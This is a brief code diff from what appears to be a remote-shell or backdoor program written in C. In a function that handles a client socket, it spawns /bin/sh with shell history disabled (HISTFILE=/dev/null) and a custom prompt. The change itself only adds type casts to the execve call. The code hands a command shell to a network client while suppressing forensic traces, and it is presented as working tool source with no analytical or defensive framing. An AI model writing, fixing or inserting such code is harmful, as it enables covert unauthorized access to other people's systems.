@@ -88,7 +88,7 @@ void fuck(int client_sock)
 			char const *env[]  = { "HISTFILE=/dev/null", "SAVEHIST=",
 			                       "PS1=\n[$(whoami)@$(hostname)]:$(pwd)\\$ ",
 			                       "LANG=en_US.UTF-8", NULL };
-			execve("/bin/sh", args, env);
+			execve("/bin/sh", (char **)args, (char **)env);
 		}
 	}
 	if(read_size == 0)
